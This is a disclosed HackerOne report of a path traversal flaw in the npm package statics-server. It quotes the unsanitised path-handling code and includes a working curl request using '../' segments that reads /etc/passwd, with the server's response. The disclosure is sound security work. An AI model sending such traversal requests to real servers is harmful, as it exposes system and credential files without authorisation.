# [statics-server] Path Traversal due to lack of provided path sanitization

## Report Details
- **Report ID**: 355456
- **URL**: https://hackerone.com/reports/355456
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-05-21T08:40:12.493Z
- **Disclosed**: 2019-04-03T20:05:24.566Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi Team, 

I would like to report Path Traversal in ```statics-server``` module.
It allows to read content of any arbitrary file from the server.

## Module

**module name:** statics-server
**version:** 0.0.9
**npm page:** https://www.npmjs.com/package/statics-server

### Module Description


npm install statics-server -g

Go to the folder you want to statics-server

Run the server statics-server


### Module Stats

~80-100 downloads/month

## Vulnerability Description

Path Traversal vulnerability in this module allows to go up in directory tree and read content of any file, including critical files like ```/etc/passwd```

Vulnerability exists, because ```staticPath``` is used directly, without any sanitization:

```javascript
    // node_modules/statics-server/index.js, line 13

    const staticPath=path.resolve('.'+decodeURIComponent(req.url));
    const indexPath=path.resolve(staticPath,'index.html');

    (...)

    // node_modules/statics-server/index.js, line 36 

    if(fs.existsSync(staticPath)){
        fs.createReadStream(staticPath).pipe(res);
    }else {
        res.end('404文件未找到');
    }
   
```


## Steps To Reproduce:

Install ```statics-server``` module:

```
$ npm install statics-server
```

Run ```statics-server```:

```
$ ./node_modules/statics-server/index.js 
服务器已经启动
访问localhost:8080

```

Run following curl command to retrieve content of ```/etc/passwd``` (adjust amount of ../ to reflect your system):

```
$ curl -v --path-as-is http://127.0.0.1:8080/../../../../../../../../etc/passwd
*   Trying 127.0.0.1...
* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
> GET /../../../../../../../../etc/passwd HTTP/1.1
> Host: 127.0.0.1:8080
> User-Agent: curl/7.47.0
> Accept: */*
> 
< HTTP/1.1 200 OK
< Date: Mon, 14 May 2018 14:53:15 GMT
< Connection: keep-alive
< Transfer-Encoding: chunked
< 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
(...)
mongodb:x:126:65534::/var/lib/mongodb:/bin/false
* Connection #0 to host 127.0.0.1 left intact
```

## Patch

```staticPath``` should be sanitized against Path Traversal attacks 

## Supporting Material/References:

- Operating system: Ubuntu 16.04
- Node.js 8.11.1
- npm v. 6.0.1
- curl 7.47.0

## Wrap up

- I contacted the maintainer to let him know: [N] 
- I opened an issue in the related repository: [N] 


Regards,

Rafal 'bl4de' Janicki

## Impact

An attacker can exploit this vulnerability to gain an access to any file on the remote server.

## Attachments
No attachments
